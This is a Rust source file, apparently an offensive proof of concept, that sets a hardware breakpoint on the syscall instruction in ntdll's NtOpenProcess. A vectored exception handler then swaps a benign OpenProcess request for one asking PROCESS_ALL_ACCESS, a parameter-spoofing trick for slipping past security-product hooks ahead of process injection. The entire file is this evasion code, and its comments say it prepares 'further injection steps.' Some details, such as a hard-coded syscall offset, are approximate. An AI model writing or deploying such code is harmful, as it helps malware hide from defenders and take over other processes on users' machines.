use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::Threading::*;
use std::ptr;

// Define the state for the exception handler
#[repr(C)]
struct InjectionState {
    syscall_address: *const c_void,           // Address of the syscall instruction
    process_handle: *mut HANDLE,              // Pointer to store the process handle
    desired_access: u32,                      // Desired access rights
    object_attributes: *mut OBJECT_ATTRIBUTES,// Object attributes for NtOpenProcess
    client_id: *mut CLIENT_ID,                // Client ID (target PID)
}

// Initialize static state (unsafe due to mutability)
static mut INJECTION_STATE: InjectionState = InjectionState {
    syscall_address: ptr::null(),
    process_handle: ptr::null_mut(),
    desired_access: 0,
    object_attributes: ptr::null_mut(),
    client_id: ptr::null_mut(),
};

// Exception handler for hardware breakpoints
extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        // Get exception record and context
        let exception_record = (*exception_info).ExceptionRecord;
        let context = (*exception_info).ContextRecord;

        // Check if the exception is due to our hardware breakpoint
        if (*exception_record).ExceptionCode == EXCEPTION_SINGLE_STEP.0 as u32
            && (*exception_record).ExceptionAddress == INJECTION_STATE.syscall_address
        {
            // Modify registers for NtOpenProcess with malicious parameters
            (*context).Rcx = INJECTION_STATE.process_handle as u64;        // ProcessHandle
            (*context).Rdx = INJECTION_STATE.desired_access as u64;        // DesiredAccess
            (*context).R8 = INJECTION_STATE.object_attributes as u64;      // ObjectAttributes
            (*context).R9 = INJECTION_STATE.client_id as u64;              // ClientId

            // Disable the breakpoint to prevent further triggers
            (*context).Dr7 = 0;

            return EXCEPTION_CONTINUE_EXECUTION.0 as i32;
        }
    }
    EXCEPTION_CONTINUE_SEARCH.0 as i32
}

fn main() {
    unsafe {
        // Load ntdll.dll
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_invalid() {
            panic!("Failed to load ntdll.dll");
        }

        // Get NtOpenProcess address
        let nt_open_process = GetProcAddress(ntdll, b"NtOpenProcess\0".as_ptr() as *const i8);
        if nt_open_process.is_null() {
            panic!("Failed to get NtOpenProcess address");
        }

        // Assume syscall instruction is at NtOpenProcess + 0x12 (example offset)
        // In practice, parse ntdll.dll to find the exact syscall instruction (e.g., 0x0F05)
        let syscall_address = (nt_open_process as *const u8).add(0x12) as *const c_void;
        if syscall_address.is_null() {
            panic!("Invalid syscall address");
        }

        // Set up injection parameters
        let mut process_handle: HANDLE = HANDLE::default();
        let desired_access = PROCESS_ALL_ACCESS.0; // Full access for injection
        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            ..Default::default()
        };
        // Target process ID (replace with actual PID)
        let mut client_id = CLIENT_ID {
            UniqueProcess: HANDLE(GetCurrentProcessId() as isize), // Example: current process
            UniqueThread: HANDLE::default(),
        };

        // Update INJECTION_STATE
        INJECTION_STATE = InjectionState {
            syscall_address,
            process_handle: &mut process_handle,
            desired_access,
            object_attributes: &mut object_attributes,
            client_id: &mut client_id,
        };

        // Register Vectored Exception Handler
        let handler = AddVectoredExceptionHandler(1, Some(exception_handler));
        if handler.is_null() {
            panic!("Failed to register VEH");
        }

        // Get current thread handle
        let thread = GetCurrentThread();
        if thread.is_invalid() {
            panic!("Failed to get current thread handle");
        }

        // Get thread context
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS.0;
        if !GetThreadContext(thread, &mut context).as_bool() {
            RemoveVectoredExceptionHandler(handler);
            panic!("Failed to get thread context");
        }

        // Set hardware breakpoint on syscall instruction
        context.Dr0 = syscall_address as u64;
        // Enable execute breakpoint on DR0 (L0=1, R/W0=00)
        context.Dr7 = (context.Dr7 & !0x000F0003) | 0x00000001;

        // Set thread context
        if !SetThreadContext(thread, &context).as_bool() {
            RemoveVectoredExceptionHandler(handler);
            panic!("Failed to set thread context");
        }

        // Call OpenProcess with benign parameters
        let benign_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION,
            FALSE,
            GetCurrentProcessId(),
        );
        if benign_handle.is_invalid() {
            println!("OpenProcess returned invalid handle (expected due to parameter modification)");
        }

        // The exception handler should have modified parameters, so process_handle
        // now contains the handle to the target process (if successful)
        if !process_handle.is_invalid() {
            println!("Successfully obtained process handle: {:?}", process_handle);
            // Proceed with further injection steps using process_handle...
            CloseHandle(process_handle);
        } else {
            println!("Failed to obtain process handle");
        }

        // Clean up
        RemoveVectoredExceptionHandler(handler);
        FreeLibrary(ntdll);
    }
}
